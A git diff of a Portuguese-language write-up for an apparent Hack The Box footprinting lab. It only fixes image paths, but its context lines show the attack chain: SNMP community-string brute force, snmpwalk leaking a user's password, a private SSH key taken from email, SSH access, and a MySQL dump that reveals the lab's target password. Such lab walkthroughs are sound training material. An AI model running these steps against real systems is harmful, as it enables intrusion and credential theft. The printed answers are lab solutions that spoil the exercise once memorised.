@@ -140,7 +140,7 @@ discovery, que encontrou a community string **`backup`**:
 onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt 10.129.62.80
 ```
 
-![Brute force de community string SNMP com onesixtyone](img/footprinting-tests-hard/01-snmp-bruteforce.png)
+![Brute force de community string SNMP com onesixtyone](../img/footprinting-tests-hard/01-snmp-bruteforce.png)
 
 ### Etapa 2 — `snmpwalk`: senha do `tom` vazada
 
@@ -160,7 +160,7 @@ iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
 iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
 ```
 
-![snmpwalk com a community backup revela a senha do tom](img/footprinting-tests-hard/02-snmpwalk-tom-creds.png)
+![snmpwalk com a community backup revela a senha do tom](../img/footprinting-tests-hard/02-snmpwalk-tom-creds.png)
 
 !!! success "Credenciais obtidas (SNMP)"
     - **Usuário:** `tom`
@@ -189,7 +189,7 @@ b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-![Leitura do e-mail do tom via POP3S com a chave SSH](img/footprinting-tests-hard/03-pop3s-tom-email.png)
+![Leitura do e-mail do tom via POP3S com a chave SSH](../img/footprinting-tests-hard/03-pop3s-tom-email.png)
 
 !!! success "Chave obtida (POP3S)"
     Chave SSH privada (`id_rsa`) do `tom`, enviada por e-mail pelo `Admin`.
@@ -206,7 +206,7 @@ chmod 600 id_rsa
 ssh -i id_rsa tom@10.129.62.80
 ```
 
-![Acesso SSH como tom — leitura do .mysql_history](img/footprinting-tests-hard/04-ssh-access-tom.png)
+![Acesso SSH como tom — leitura do .mysql_history](../img/footprinting-tests-hard/04-ssh-access-tom.png)
 
 Acesso obtido como `tom@NIXHARD`. O `.mysql_history` já indicava consultas à
 tabela `users`.
@@ -222,7 +222,7 @@ mysql -u tom -p
 ssh-keygen -t rsa -b 4096
 ```
 
-![Conteúdo do .bash_history do tom](img/footprinting-tests-hard/05-bash-history.png)
+![Conteúdo do .bash_history do tom](../img/footprinting-tests-hard/05-bash-history.png)
 
 !!! tip "Pista"
     O histórico mostra que o `tom` acessa o **MySQL** localmente (`mysql -u tom -p`)
@@ -234,7 +234,7 @@ ssh-keygen -t rsa -b 4096
 mysql -u tom -p   # senha: NMds732Js2761
 ```
 
-![Login bem-sucedido no MySQL como tom](img/footprinting-tests-hard/06-mysql-login-tom.png)
+![Login bem-sucedido no MySQL como tom](../img/footprinting-tests-hard/06-mysql-login-tom.png)
 
 ```sql
 show databases;
@@ -242,13 +242,13 @@ use users;
 SELECT * FROM users;
 ```
 
-![Navegação no MySQL em busca do usuário HTB](img/footprinting-tests-hard/07-mysql-navigation.png)
+![Navegação no MySQL em busca do usuário HTB](../img/footprinting-tests-hard/07-mysql-navigation.png)
 
-![Tabela users com os registros de credenciais](img/footprinting-tests-hard/08-mysql-users-table.png)
+![Tabela users com os registros de credenciais](../img/footprinting-tests-hard/08-mysql-users-table.png)
 
 Entre os registros, o usuário `HTB` (id `150`) com a senha-alvo:
 
-![Credenciais do usuário HTB encontradas](img/footprinting-tests-hard/09-htb-password-found.png)
+![Credenciais do usuário HTB encontradas](../img/footprinting-tests-hard/09-htb-password-found.png)
 
 ```text
 150 | HTB | cr3n4o7rzse7rzhnckhssncif7ds
